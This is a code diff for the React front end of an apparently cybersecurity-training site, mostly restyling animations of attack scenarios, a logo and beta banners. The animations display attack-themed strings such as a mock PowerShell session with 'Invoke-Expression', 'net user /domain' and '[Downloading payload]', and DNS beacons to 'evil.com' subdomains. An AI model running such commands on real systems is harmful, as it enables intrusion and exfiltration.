-      <div style={{position:"absolute",inset:0,background:"radial-gradient(ellipse at 50% 50%,rgba(139,92,246,0.1) 0%,transparent 70%)"}}/>
-      <div style={{position:"absolute",top:20,left:"50%",transform:"translateX(-50%)",
-        width:260,height:110,background:"#0a0e1a",border:"1px solid #8b5cf6",
-        borderRadius:8,padding:10,fontFamily:"monospace",
-        boxShadow:"0 0 30px rgba(139,92,246,0.3)",animation:"float2 4s ease-in-out infinite"}}>
-        <div style={{display:"flex",gap:4,marginBottom:8}}>
-          {["#dc2626","#f59e0b","#22c55e"].map((c,i)=>(
-            <div key={i} style={{width:8,height:8,borderRadius:"50%",background:c}}/>
-          ))}
-          <span style={{fontSize:8,color:"#6b7280",marginLeft:4}}>PowerShell</span>
-        </div>
-        {[
-          {text:"PS C:\> whoami", color:"#22c55e", delay:0},
-          {text:"CORP\admin", color:"#e8ecf4", delay:0.5},
-          {text:"PS C:\> Invoke-Expression...", color:"#22c55e", delay:1},
-          {text:"[Downloading payload]", color:"#f87171", delay:1.5},
-          {text:"PS C:\> net user /domain", color:"#22c55e", delay:2},
-          {text:"Enumerating 847 accounts...", color:"#fbbf24", delay:2.5},
-        ].map((line,i)=>(
-          <div key={i} style={{fontSize:8.5,color:line.color,marginBottom:2,lineHeight:1.4,
-            animation:`blink2 ${4}s ${line.delay}s step-end infinite`,
-            opacity: i < 4 ? 1 : 0.6}}>
-            {line.text}
-          </div>
-        ))}
-        <div style={{display:"inline-block",width:6,height:12,background:"#22c55e",
-          animation:"blink2 0.8s step-end infinite",verticalAlign:"middle"}}/>
-      </div>
-      {/* Scanline effect */}
-      <div style={{position:"absolute",top:20,left:"50%",transform:"translateX(-50%)",
-        width:260,height:110,borderRadius:8,overflow:"hidden",pointerEvents:"none"}}>
-        <div style={{position:"absolute",width:"100%",height:2,background:"rgba(139,92,246,0.15)",
-          animation:"scanline 3s linear infinite"}}/>
-      </div>
-    </div>
-  );
-
-  // IMPOSSIBLE TRAVEL ANIMATION — Globe with two location pins
-  if (type === "travel") return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden",
-      display:"flex",alignItems:"center",justifyContent:"center"}}>
-      <style>{animations}</style>
-      <div style={{position:"relative",width:120,height:120}}>
-        {/* Globe */}
-        <div style={{width:100,height:100,borderRadius:"50%",margin:"10px auto",
-          background:"radial-gradient(circle at 35% 35%,#1e3a5f,#0a0d14)",
-          border:"1px solid #1e40af",position:"relative",overflow:"hidden",
-          boxShadow:"0 0 30px rgba(59,130,246,0.3)",animation:"float2 4s ease-in-out infinite"}}>
-          {/* Grid lines */}
-          {[20,40,60,80].map(x=>(
-            <div key={x} style={{position:"absolute",left:`${x}%`,top:0,bottom:0,
-              width:1,background:"rgba(59,130,246,0.2)"}}/>
-          ))}
-          {[25,50,75].map(y=>(
-            <div key={y} style={{position:"absolute",top:`${y}%`,left:0,right:0,
-              height:1,background:"rgba(59,130,246,0.2)"}}/>
-          ))}
-          {/* Continents (simplified) */}
-          <div style={{position:"absolute",top:"20%",left:"10%",width:"35%",height:"30%",
-            background:"rgba(34,197,94,0.3)",borderRadius:"40% 60% 50% 40%"}}/>
-          <div style={{position:"absolute",top:"30%",left:"55%",width:"30%",height:"35%",
-            background:"rgba(34,197,94,0.3)",borderRadius:"30% 50% 40% 60%"}}/>
-        </div>
-        {/* Pin 1 - Mumbai */}
-        <div style={{position:"absolute",top:15,left:10,animation:"float2 3s ease-in-out infinite"}}>
-          <div style={{fontSize:16}}>📍</div>
-          <div style={{fontSize:7,color:"#22c55e",fontFamily:"monospace",fontWeight:700,
-            whiteSpace:"nowrap"}}>Mumbai 09:00</div>
-        </div>
-        {/* Pin 2 - London */}
-        <div style={{position:"absolute",top:10,right:5,
-          animation:"float2 3s 1.5s ease-in-out infinite"}}>
-          <div style={{fontSize:16}}>📍</div>
-          <div style={{fontSize:7,color:"#ef4444",fontFamily:"monospace",fontWeight:700,
-            whiteSpace:"nowrap"}}>London 09:05</div>
-        </div>
-        {/* Distance line */}
-        <div style={{position:"absolute",top:28,left:30,width:55,height:1,
-          background:"linear-gradient(to right,#22c55e,#ef4444)",
-          transform:"rotate(-5deg)",animation:"zap 2s ease-in-out infinite"}}/>
-        {/* Warning */}
-        <div style={{position:"absolute",bottom:0,left:"50%",transform:"translateX(-50%)",
-          fontSize:10,color:"#ef4444",fontFamily:"monospace",fontWeight:700,
-          whiteSpace:"nowrap",animation:"blink2 1s infinite"}}>⚠ 5 MIN APART</div>
-      </div>
-    </div>
-  );
-
-  // USB ANIMATION — USB plugging in, data streaming out
-  if (type === "usb") return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden",
-      display:"flex",alignItems:"center",justifyContent:"center"}}>
-      <style>{animations}</style>
-      <div style={{position:"relative"}}>
-        {/* Computer */}
-        <div style={{width:90,height:60,background:"#1e2533",border:"1px solid #374151",
-          borderRadius:6,display:"flex",alignItems:"center",justifyContent:"center",
-          position:"relative",boxShadow:"0 4px 20px rgba(0,0,0,0.4)",
-          animation:"float2 4s ease-in-out infinite"}}>
-          <div style={{fontSize:22}}>🖥</div>
-          {/* USB port */}
-          <div style={{position:"absolute",right:-8,top:"50%",transform:"translateY(-50%)",
-            width:8,height:12,background:"#374151",borderRadius:"0 2px 2px 0",
-            border:"1px solid #4b5563"}}/>
-        </div>
-        {/* USB drive */}
-        <div style={{position:"absolute",right:-45,top:"50%",transform:"translateY(-50%)",
-          animation:"usb_insert 2s 0.5s ease-out forwards"}}>
-          <svg width="40" height="20" viewBox="0 0 40 20"
-            style={{filter:"drop-shadow(0 0 8px rgba(251,191,36,0.8))"}}>
-            <rect x="8" y="4" width="28" height="12" rx="2" fill="#fbbf24"/>
-            <rect x="0" y="6" width="10" height="8" rx="1" fill="#92400e"/>
-            <rect x="14" y="7" width="4" height="6" rx="1" fill="#451a03" opacity="0.5"/>
-            <rect x="20" y="7" width="4" height="6" rx="1" fill="#451a03" opacity="0.5"/>
-          </svg>
-          <div style={{fontSize:8,color:"#fbbf24",fontFamily:"monospace",fontWeight:700,
-            marginTop:2,textAlign:"center"}}>INSIDER</div>
-        </div>
-        {/* Data streaming out */}
-        {[0,1,2,3,4].map(i=>(
-          <div key={i} style={{position:"absolute",left:95,top:20+i*8,
-            fontSize:8,color:"#ef4444",fontFamily:"monospace",
-            animation:`data_leak 1.5s ${i*0.3}s ease-in infinite`}}>
-            {"0x"+Math.floor(Math.random()*256).toString(16).toUpperCase().padStart(2,'0')}
+      {/* Stats */}
+      <div style={{position:"absolute",bottom:6,left:"50%",transform:"translateX(-50%)",
+        display:"flex",gap:8}}>
+        {[["847","DNS queries/hr"],["4.2/5","entropy"],["27","unique subdomains"]].map(([v,l])=>(
+          <div key={l} style={{textAlign:"center",background:"rgba(16,185,129,0.08)",
+            border:"1px solid rgba(16,185,129,0.2)",borderRadius:4,padding:"2px 6px"}}>
+            <div style={{fontSize:9,fontWeight:800,color:"#34d399",fontFamily:"monospace"}}>{v}</div>
+            <div style={{fontSize:5.5,color:"#4b5563",fontFamily:"monospace"}}>{l}</div>
           </div>
         ))}
       </div>
     </div>
   );
 
-  // DNS BEACONING ANIMATION — Packets flying to external server
-  if (type === "dns") return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden"}}>
-      <style>{animations}</style>
-      <div style={{position:"absolute",inset:0,
-        background:"radial-gradient(ellipse at 50% 50%,rgba(16,185,129,0.08) 0%,transparent 70%)"}}/>
-      {/* Internal server */}
-      <div style={{position:"absolute",left:20,top:"50%",transform:"translateY(-50%)",
-        textAlign:"center",animation:"float2 3s ease-in-out infinite"}}>
-        <div style={{fontSize:28}}>🖥</div>
-        <div style={{fontSize:8,color:"#6b7280",fontFamily:"monospace"}}>CORP</div>
-      </div>
-      {/* DNS packets streaming */}
-      {[0,1,2,3,4,5].map(i=>(
-        <div key={i} style={{position:"absolute",
-          left:60,top:`${25+i*18}%`,
-          animation:`stream 2s ${i*0.35}s linear infinite`}}>
-          <div style={{fontSize:8,color:"#10b981",fontFamily:"monospace",
-            background:"rgba(16,185,129,0.1)",padding:"1px 4px",borderRadius:2,
-            whiteSpace:"nowrap"}}>
-            {["a1b2.evil.com","c3d4.evil.com","e5f6.evil.com","g7h8.evil.com",
-              "i9j0.evil.com","k1l2.evil.com"][i]}
-          </div>
-        </div>
-      ))}
-      {/* Arrow */}
-      <div style={{position:"absolute",left:60,top:"50%",right:80,height:1,
-        background:"linear-gradient(to right,rgba(16,185,129,0.3),rgba(16,185,129,0.8))",
-        transform:"translateY(-50%)"}}/>
-      {/* C2 server */}
-      <div style={{position:"absolute",right:20,top:"50%",transform:"translateY(-50%)",
-        textAlign:"center",animation:"glow 2s ease-in-out infinite"}}>
-        <div style={{fontSize:28}}>☠️</div>
-        <div style={{fontSize:8,color:"#ef4444",fontFamily:"monospace",fontWeight:700}}>C2</div>
-        {[0,1].map(i=>(
-          <div key={i} style={{position:"absolute",width:30,height:30,
-            borderRadius:"50%",border:"1px solid rgba(220,38,38,0.4)",
-            top:-5,left:-5,animation:`ping 2s ${i}s ease-out infinite`}}/>
-        ))}
-      </div>
-    </div>
-  );
-
-  // PORT SCAN / BEC / BRUTEFORCE — Radar sweep animation
-  if (["portscan","bruteforce"].includes(type)) return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden",
+  /* ── RADAR (port scan, bruteforce, pentest) ──────────────── */
+  if(["portscan","bruteforce","pentest"].includes(type)) return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060c0a 0%,#0a1018 100%)",borderRadius:"0 0 8px 8px",
       display:"flex",alignItems:"center",justifyContent:"center"}}>
-      <style>{animations}</style>
-      {/* Radar */}
-      <div style={{position:"relative",width:110,height:110}}>
-        <div style={{width:110,height:110,borderRadius:"50%",
-          border:"1px solid rgba(59,130,246,0.3)",
-          background:"radial-gradient(circle,rgba(59,130,246,0.05) 0%,transparent 70%)",
-          position:"relative",overflow:"hidden"}}>
-          {/* Rings */}
-          {[35,55,75].map(r=>(
-            <div key={r} style={{position:"absolute",borderRadius:"50%",
-              border:"1px solid rgba(59,130,246,0.2)",
-              width:r,height:r,top:"50%",left:"50%",
-              transform:"translate(-50%,-50%)"}}/>
-          ))}
-          {/* Sweep */}
-          <div style={{position:"absolute",top:"50%",left:"50%",
-            width:"50%",height:1,transformOrigin:"left center",
-            background:"linear-gradient(to right,transparent,rgba(59,130,246,0.8))",
-            animation:"orbit 2s linear infinite",
-            boxShadow:"0 0 6px rgba(59,130,246,0.6)"}}/>
-          {/* Blips */}
-          {[[30,40],[60,25],[45,65],[75,55],[20,70]].map(([x,y],i)=>(
-            <div key={i} style={{position:"absolute",
-              left:`${x}%`,top:`${y}%`,
-              width:4,height:4,borderRadius:"50%",
-              background:i<3?"#ef4444":"#22c55e",
-              animation:`ping 1.5s ${i*0.4}s ease-out infinite`}}/>
-          ))}
+      <style>{css}</style>
+
+      {/* Radar base */}
+      <div style={{position:"relative",width:130,height:130}}>
+        {/* Outer rings */}
+        {[130,95,60,30].map((d,i)=>(
+          <div key={d} style={{position:"absolute",
+            width:d,height:d,borderRadius:"50%",
+            border:`1px solid rgba(59,130,246,${0.08+i*0.04})`,
+            top:"50%",left:"50%",
+            transform:"translate(-50%,-50%)"}}/>
+        ))}
+        {/* Cross hairs */}
+        <div style={{position:"absolute",top:"50%",left:0,right:0,height:1,
+          background:"rgba(59,130,246,0.12)",transform:"translateY(-50%)"}}/>
+        <div style={{position:"absolute",left:"50%",top:0,bottom:0,width:1,
+          background:"rgba(59,130,246,0.12)",transform:"translateX(-50%)"}}/>
+
+        {/* Sweep */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          width:65,height:65,transformOrigin:"0 0",
+          animation:"ia_radar 2.5s linear infinite"}}>
+          <div style={{position:"absolute",top:0,left:0,
+            width:65,height:65,
+            background:"conic-gradient(from 0deg,transparent 0deg,rgba(59,130,246,0.25) 60deg,transparent 80deg)",
+            borderRadius:"0 100% 0 0"}}/>
+          {/* Sweep line */}
+          <div style={{position:"absolute",top:0,left:0,width:65,height:2,
+            background:"linear-gradient(to right,rgba(59,130,246,0.8),transparent)",
+            transformOrigin:"0 1px",
+            boxShadow:"0 0 8px rgba(59,130,246,0.4)"}}/>
         </div>
-        <div style={{textAlign:"center",marginTop:6,fontSize:9,color:"#3b82f6",
-          fontFamily:"monospace",fontWeight:700,
-          animation:"blink2 1s infinite"}}>
-          {type==="portscan"?"SCANNING 847 HOSTS":"847 FAILED ATTEMPTS"}
+
+        {/* Blips */}
+        {[[35,25,"#ef4444"],[68,55,"#ef4444"],[20,70,"#f59e0b"],
+          [85,35,"#ef4444"],[45,85,"#22c55e"],[75,75,"#f59e0b"]].map(([x,y,c],i)=>(
+          <div key={i} style={{position:"absolute",
+            left:`${x}%`,top:`${y}%`,
+            width:5,height:5,borderRadius:"50%",
+            background:c,transform:"translate(-50%,-50%)",
+            boxShadow:`0 0 6px ${c}`,
+            animation:`ia_ping2 ${1.5+i*0.3}s ${i*0.4}s ease-out infinite`}}/>
+        ))}
+
+        {/* Center dot */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          width:6,height:6,borderRadius:"50%",background:"#3b82f6",
+          transform:"translate(-50%,-50%)",
+          boxShadow:"0 0 10px rgba(59,130,246,0.8)"}}/>
+      </div>
+
+      {/* Stats */}
+      <div style={{position:"absolute",bottom:6,left:"50%",
+        transform:"translateX(-50%)",
+        background:"rgba(59,130,246,0.08)",border:"1px solid rgba(59,130,246,0.2)",
+        borderRadius:6,padding:"3px 12px"}}>
+        <div style={{fontSize:8,color:"#60a5fa",fontFamily:"monospace",fontWeight:700,
+          letterSpacing:"0.1em",animation:"ia_blink 2s ease-in-out infinite"}}>
+          {type==="portscan"?"SCANNING 847 HOSTS · PORTS 22/80/443/3389":
+           type==="bruteforce"?"847 FAILED AUTH ATTEMPTS · 12 ACCOUNTS":
+           "PENTEST SCAN DETECTED · NMAP + MODULES"}
         </div>
       </div>
     </div>
   );
 
-  // DEFAULT / BEC / CLOUD — Shield breach animation
+  /* ── BEC / CLOUD / DEFAULT ───────────────────────────────── */
   return (
-    <div style={{position:"relative",width:"100%",height:160,overflow:"hidden",
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1220 100%)",borderRadius:"0 0 8px 8px",
       display:"flex",alignItems:"center",justifyContent:"center"}}>
-      <style>{animations}</style>
-      <div style={{position:"relative",animation:"float2 3s ease-in-out infinite"}}>
-        <div style={{fontSize:70,filter:"drop-shadow(0 0 20px rgba(220,38,38,0.5))",
-          animation:"shake 3s 1s ease-in-out infinite"}}>
-          {type==="cloud"?"☁️":"📧"}
+      <style>{css}</style>
+      <div style={{textAlign:"center",animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:64,animation:"ia_glow 2s ease-in-out infinite",
+          filter:"drop-shadow(0 0 20px rgba(220,38,38,0.5))"}}>
+          {type==="cloud"?"☁️":type==="bec"?"📧":"⚠️"}
         </div>
-        <div style={{position:"absolute",top:-5,right:-5,fontSize:24}}>⚠️</div>
+        <div style={{position:"absolute",top:4,right:"30%",fontSize:22}}>⚠️</div>
         {[0,1,2].map(i=>(
           <div key={i} style={{position:"absolute",top:"50%",left:"50%",
-            width:60,height:60,borderRadius:"50%",
-            border:"2px solid rgba(220,38,38,0.4)",
+            width:70,height:70,borderRadius:"50%",
+            border:"1.5px solid rgba(220,38,38,0.3)",
             transform:"translate(-50%,-50%)",
-            animation:`ping 2s ${i*0.7}s ease-out infinite`}}/>
+            animation:`ia_ping ${2}s ${i*0.7}s ease-out infinite`}}/>
         ))}
       </div>
     </div>
@@ -4563,20 +4745,29 @@ input:focus,select:focus,textarea:focus{border-color:var(--ac)}
 
 // ── logo component ────────────────────────────────────────────────────────────
 function Logo({size=32}) {
-  // LB monogram matching the uploaded logo: dark L + blue B with terminal prompt
   const s = size;
   return (
-    <svg width={s} height={s} viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-      {/* Dark L */}
-      <path d="M10 10 L10 90 L50 90 L50 76 L24 76 L24 10 Z" fill="#1e2533"/>
-      {/* Blue T */}
-      <defs><linearGradient id="ltg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stopColor="#3b82f6"/><stop offset="100%" stopColor="#1a56db"/></linearGradient></defs>
-      <path d="M38 14 L38 86 L65 86 C80 86 92 76 92 62 C92 54 88 48 82 44 C86 40 89 35 89 28 C89 20 82 14 70 14 Z M50 26 L66 26 C71 26 75 30 75 35 C75 40 71 44 66 44 L50 44 Z M50 56 L68 56 C74 56 79 60 79 66 C79 72 74 76 68 76 L50 76 Z" fill="#2563eb"/>
-      {/* Terminal prompt > _ inside B */}
-      <text x="49" y="55" fontSize="14" fontFamily="monospace" fill="white" fontWeight="bold">{">"}_</text>
+    <svg width={s} height={Math.round(s*0.85)} viewBox="0 0 120 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="ltg1" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stopColor="#6b8ef5"/>
+          <stop offset="60%" stopColor="#3b5ef8"/>
+          <stop offset="100%" stopColor="#1a3ed4"/>
+        </linearGradient>
+        <linearGradient id="ltg2" x1="0%" y1="0%" x2="0%" y2="100%">
+          <stop offset="0%" stopColor="#4f7ef8"/>
+          <stop offset="100%" stopColor="#1a3ed4"/>
+        </linearGradient>
+      </defs>
+      <path d="M5 8 L5 92 L48 92 L48 80 L18 80 L18 8 Z" fill="#2d3142"/>
+      <path d="M28 8 L115 8 L115 24 L28 24 Z" fill="url(#ltg1)"/>
+      <path d="M58 24 L58 92 L74 92 L74 24 Z" fill="url(#ltg2)"/>
+      <path d="M74 24 L82 8 L90 8 L82 24 Z" fill="rgba(255,255,255,0.15)"/>
+      <path d="M54 88 L78 88 L78 96 L54 96 Z" fill="url(#ltg2)" opacity="0.6"/>
     </svg>
   );
 }
+
 
 // ── policy page data (replaces 7 separate components) ────────────────────────
 const POLICIES = {
@@ -4766,7 +4957,7 @@ function Landing({nav=()=>{},appUser=null}) {
         {/* Beta badge */}
         <div style={{display:"inline-flex",alignItems:"center",gap:7,background:"#fff",border:"1px solid #e1e4ed",color:"#5a6272",padding:"5px 13px",borderRadius:100,fontSize:11,fontWeight:600,marginBottom:20,position:"relative",zIndex:1,fontFamily:"var(--mo)",boxShadow:"0 1px 3px rgba(17,19,24,0.06)"}}>
           <div style={{width:6,height:6,borderRadius:"50%",background:"#16a34a",animation:"pulse 2s infinite"}}/>
-          🎉 Beta — All 10 Investigations Free
+          Free Beta · No signup required to explore
         </div>
         {/* Headline */}
         <h1 style={{fontSize:"clamp(26px,5vw,54px)",fontWeight:800,lineHeight:1.1,letterSpacing:"-0.03em",marginBottom:14,color:"#111318",position:"relative",zIndex:1}}>
@@ -5089,16 +5280,9 @@ function Dashboard({nav,appUser={name:"Analyst"},prog={xp:0,level:1,done:{}},lvl
   const [showUpgrade,setShowUpgrade]=useState(false);
   return (
     <div style={{padding:"20px"}}>
-      <div style={{background:"linear-gradient(135deg,#1a56db,#7c3aed)",borderRadius:12,padding:"12px 16px",marginBottom:20,display:"flex",alignItems:"center",gap:10,flexWrap:"wrap"}}><span style={{fontSize:18}}>{"🎉"}</span><div style={{flex:1}}><div style={{fontSize:13,fontWeight:700,color:"#fff"}}>Beta — All 10 Investigations Free</div><div style={{fontSize:11,color:"rgba(255,255,255,0.75)"}}>No credit card. No catch. Full access during beta.</div></div></div>
+      <div style={{display:"none"}}><span style={{fontSize:18}}>{"🎉"}</span><div style={{flex:1}}><div style={{fontSize:13,fontWeight:700,color:"#fff"}}>Beta — All 10 Investigations Free</div><div style={{fontSize:11,color:"rgba(255,255,255,0.75)"}}>No credit card. No catch. Full access during beta.</div></div></div>
       {/* Beta free banner */}
-      <div style={{background:"linear-gradient(135deg,#1a56db,#7c3aed)",borderRadius:12,padding:"12px 16px",marginBottom:20,display:"flex",alignItems:"center",gap:10,flexWrap:"wrap"}}>
-        <span style={{fontSize:18}}>🎉</span>
-        <div style={{flex:1,minWidth:200}}>
-          <div style={{fontSize:13,fontWeight:700,color:"#fff"}}>Beta — All 10 Investigations Free</div>
-          <div style={{fontSize:11,color:"rgba(255,255,255,0.75)"}}>No credit card. No catch. Full access while we are in beta.</div>
-        </div>
-        <div style={{fontSize:10,fontWeight:700,color:"rgba(255,255,255,0.6)",fontFamily:"var(--mo)",letterSpacing:"0.08em",textTransform:"uppercase",flexShrink:0}}>Limited Time</div>
-      </div>
+      <div style={{display:"none"}}/>
       {showUpgrade&&(
         <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.75)",zIndex:500,display:"flex",alignItems:"center",justifyContent:"center",padding:20}} onClick={()=>setShowUpgrade(false)}>
           <div style={{background:"#fff",borderRadius:16,maxWidth:420,width:"100%",overflow:"hidden"}} onClick={e=>e.stopPropagation()}>
